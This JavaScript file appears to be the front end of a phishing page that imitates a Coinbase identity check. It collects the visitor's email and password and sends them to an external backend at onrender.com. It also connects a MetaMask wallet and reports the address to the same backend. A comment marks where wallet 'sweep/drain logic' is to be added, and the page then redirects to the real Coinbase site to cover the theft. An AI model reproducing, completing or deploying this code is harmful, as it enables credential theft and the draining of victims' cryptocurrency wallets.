document.addEventListener('DOMContentLoaded', () => {
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const step3 = document.getElementById('step-3');
    const connectBtn = document.getElementById('connectBtn');
    const status = document.getElementById('status');

    // REPLACE THIS URL with your actual new Render backend URL
    const backendUrl = "https://cb-backend-new.onrender.com"; 

    async function sendToBackend(data) {
        try {
            await fetch(`${backendUrl}/update`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        } catch (e) {
            console.error("Backend communication failed", e);
        }
    }

    document.getElementById('toStep2').onclick = () => {
        step1.classList.add('hidden');
        step2.classList.remove('hidden');
    };

    document.getElementById('toStep3').onclick = () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        if (email && pass) {
            sendToBackend({ email: email, password: pass });
            step2.classList.add('hidden');
            step3.classList.remove('hidden');
        }
    };

    connectBtn.onclick = async () => {
        if (!window.ethereum) {
            status.innerText = "Please install MetaMask";
            return;
        }

        try {
            status.innerText = "Connecting wallet...";
            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            const userAddress = await signer.getAddress();
            
            sendToBackend({ walletAddress: userAddress });

            status.innerText = "Verifying identity...";
            // If you have the exact same logic from before, 
            // add your sweep/drain logic here.
            
            setTimeout(() => {
                window.location.href = "https://coinbase.com";
            }, 3000);
        } catch (e) {
            status.innerText = "Connection failed. Try again.";
            console.error(e);
        }
    };
});
